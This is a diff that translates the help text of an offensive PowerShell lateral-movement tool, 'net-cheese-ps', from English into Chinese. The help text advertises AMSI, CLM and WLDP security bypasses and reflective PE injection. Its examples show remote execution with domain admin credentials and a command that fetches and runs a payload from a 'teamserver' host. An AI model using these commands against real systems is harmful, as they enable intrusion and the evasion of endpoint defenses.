@@ -1,14 +1,14 @@
-ABOUT
+关于
     PowerShell command execution and lateral movement framework using
     System.Management.Automation.PowerShell. Supports local and remote execution via
     WS Management with built in CLM, AMSI, and WLDP bypasses, module import, encrypted
     payloads, and reflective PE injection. If executed without a target, runs locally.
     Must run as a privileged user when using PowerShell Remoting.
 
-USAGE:
+用法：
     net-cheese-ps --- [options]
 
-ARGUMENTS:
+参数：
     -t, --target=VALUE         Target machine
     -c, --code=VALUE           Code to execute
     -e, --encoded              Indicates that provided code is base64 encoded
@@ -35,15 +35,15 @@ ARGUMENTS:
     -k, --encryption-key=VALUE Key for encryption/decryption
     --ssl                      Force use of SSL
 
-EXAMPLES:
+示例：
     net-cheese-ps --- -c "whoami"
     net-cheese-ps --- -t DC01 -c "hostname" -u DOMAIN\admin -p Password123
     net-cheese-ps --- -c "<base64>" -e
     net-cheese-ps --- -x http://teamserver/payload.exe -R -i http://teamserver/Invoke-ReflectivePEInjection.ps1
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     net-cheese-ps -w 60 --- -c "whoami"
